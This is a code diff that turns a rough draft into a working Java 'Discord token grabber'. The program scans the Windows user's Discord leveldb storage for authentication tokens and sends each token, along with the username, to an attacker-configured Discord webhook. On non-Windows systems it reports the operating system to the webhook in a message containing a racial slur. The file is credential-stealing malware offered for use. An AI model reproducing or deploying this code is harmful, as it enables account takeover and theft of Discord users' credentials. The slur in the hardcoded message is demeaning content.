@@ -1,51 +1,72 @@
+/*
+Created by XEFER on 14/03/2020
+Discord token grabber for windows
+*/
+
+import java.io.BufferedReader; 
+import java.io.DataInputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 public class DiscordGrabber {
-    private static String username = System.getProperty("user.name"); //Gets the user his username
-    private static String token = ""; //Create an empty variable called token
-    private static String regex = "[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"; //The regex that will be used to look through the file
-    private static String path = "C:/Users/"+ username +"/AppData/Roaming/Discord/Local Storage/leveldb";    
+	
+	private static String username = System.getProperty("user.name");
+    private static String DiscordWebhookLink = "";
+    private static String BOTName = "";
+    private static String BOTImageURL = "";
+	
+	public static void main(String[] args) throws IOException {
 
-    public static CharSequence fromFile(String filename) throws IOException { //I kinda copy pasted this, but i am pretty sure it is to find working characters or something
-        FileInputStream input = new FileInputStream(filename);
-        FileChannel channel = input.getChannel();
-     
-        ByteBuffer bbuf = channel.map(FileChannel.MapMode.READ_ONLY, 0, (int)channel.size());
-        CharBuffer cbuf = Charset.forName("8859_1").newDecoder().decode(bbuf);
-        return cbuf;
-    }
-    
-    public static void getFileNames() {
-          
-        String[] pathnames; //Create an empty array called pathnames
+        String os = System.getProperty("os.name");
         
-        File f = new File(path); //set "File" to the directory
         
-        pathnames = f.list(); //List the files in the directory
         
-        for (String pathname : pathnames) { //Iterate through all the files
-            File file = new File(pathname); //set the results of the iteration as the new File file
-  
-            if(file == "*.ldb") {
-                file.renameTo("*.txt")
-            }          
 
+        if(os.contains("Windows")) {
+            String path = System.getProperty("user.home") +"/AppData/Roaming/Discord/Local Storage/leveldb/";;
+            String username = System.getProperty("user.name");
 
-            try { //Search for the regex expression within the file
-                Pattern pattern = Pattern.compile(regex);
-                Matcher matcher = pattern.matcher(fromFile(pathname));
-                
-                while (matcher.find()) { //When it is matched
-                    String token = matcher.group(); //add match to the group
-                    
-                }
-                
-                }catch(Exception e) {
-                    
-                }
-                if(file == "*.txt") {
-                    file.renameTo("*.ldb")
-                }
+            String[] pathnames;
+
+            File f = new File(path);
+
+            pathnames = f.list();
+        	
+        	
+        	for (String pathname : pathnames) {
+                try {
+                    FileInputStream fstream = new FileInputStream(path + pathname);
+                    DataInputStream in = new DataInputStream(fstream);
+                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
+                    String strLine;
+                    while ((strLine = br.readLine()) != null) {
+
+                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
+                        Matcher m = p.matcher(strLine);
+
+                        while (m.find()) {
+                    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink);
+                            webhook.setContent(username + "  -  " + m.group());
+                            webhook.setAvatarUrl(BOTImageURL);
+                            webhook.setUsername(BOTName);
+                            webhook.setTts(false);
+                            webhook.execute();
+                        }
+                    }
+
+                } catch (Exception e) {}
             }
-        //token = matcher.group(1); //set token to the first (and probably only) match
-    }
-    System.out.println("Your discord token is: " + token)
+        }else {
+    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink);
+            webhook.setContent(username + "  -  " + " this nigga uses " + os);
+            webhook.setAvatarUrl(BOTImageURL);
+            webhook.setUsername(BOTName);
+            webhook.setTts(false);
+            webhook.execute();
+        }
+        	
+        }      
 }
